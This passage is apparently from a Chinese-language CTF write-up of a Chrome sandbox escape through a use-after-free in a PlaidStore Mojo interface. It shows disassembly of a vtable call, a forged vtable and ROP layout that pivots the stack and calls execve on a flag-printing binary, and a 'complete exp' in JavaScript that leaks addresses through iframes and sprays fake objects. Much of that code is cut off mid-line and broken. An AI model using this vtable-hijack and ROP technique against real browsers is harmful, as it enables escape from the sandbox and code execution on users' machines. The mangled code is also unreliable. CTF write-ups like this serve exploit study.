    0000000003c582b0 t content::PlaidStoreImpl::GetData(std::__1::basic_string, std::__1::allocator > const&, unsigned int, base::OnceCallback > const&)>)
调用`IsRenderFrameLive`基调用 `vtable + 0x160` 的位置， rax 保存 `vtable` 的值
       0x00005555591ac2c7 :    mov    r14,rsi              
       0x00005555591ac2ca :    mov    rbx,rdi                        
       0x00005555591ac2cd :    mov    rdi,QWORD PTR [rdi+0x8]// rdi == render_frame_host_   
       0x00005555591ac2d1 :    mov    rax,QWORD PTR [rdi] // rax ==> vtable 
       0x00005555591ac2d4 :    call   QWORD PTR [rax+0x160]  // vtable+0x160 ==> IsRenderFrameLive
我们可以构造下面的内存布局
    frame_addr =>   [0x00] : vtable  ==> frame_addr + 0x10  ---                    [0x08] : gadget => pop rdi                 |
                /-- [0x10] : frame_addr + 0x180  pop rax                          |
                |   [0x20] : gadget => SYS_execve                       | vtable+0x10   
                |   [0x28] : gadget => xor rsi, rsi; pop rbp; jmp rax   |
                |   ...                                                 V
                |   [0x160 + 0x10] : xchg rax, rsp     [0x180 ... ] : "/home/chrome/flag_printer"
这里将`vtable -> isRenderFrameLive` 处改成`xchg rax, rsp` ， 因为 `rax` 保存`vtable` 的地址，
所以`rsp` 变成了`frame_addr + 0x10` 的地址，继续执行，最终相当于执行 拿到flag
    execve("/home/chrome/flag_printer",rsi,env);
###  完整exp
完整exp如下
    function show(msg){
        document.body.innerHTML+=msg+"";
    }
    async function main(){
        var stores = [];
        let p = blink.mojom.PlaidStore.getRemote(true); 
        for(let i=0;i{
            var frame = document.createElement("iframe");
            frame.srcdoc=`
                  let p = blink.mojom.PlaidStore.getRemote(true);
                  window.p = p;
                async function leak() {
                    //Same code with the one in pwn.js
                    var stores = [];
                    for(let i = 0;i
            `
            frame.srcdoc=`
                      var p = blink.mojom.PlaidStore.getRemote(true);
                    async function leak() {
                        //Same code with the one in pwn.js
                        console.log("Starting frame leak");
                        var stores = [];
                        for(let i = 0;i
                `
            document.body.appendChild(frame);
            return frame;
        }
        var frame = allocateFrame();
        frame.contentWindow.addEventListener("DOMContentLoaded",async ()=>{
            if(!(await frame.contentWindow.leak())){
                show("frame leak failed!");
                return;
            }
            if(frame.contentWindow.chromeBase!=chromeBase){
                show("different chrome base!! wtf!")
                return;
            }    
            var frameAddr = frame.contentWindow.renderFrameHost;
    //        show(frameAddr.toString(16));
            frameDataView.setBigInt64(0,frameAddr+0x10n,true); //vtable/ rax
            ropChainView[2] = frameAddr + 0x180n;
            var frameStore = frame.contentWindow.p;
            document.body.removeChild(frame);
            var arr = [];
            for(let i = 0;i{main();});
## reference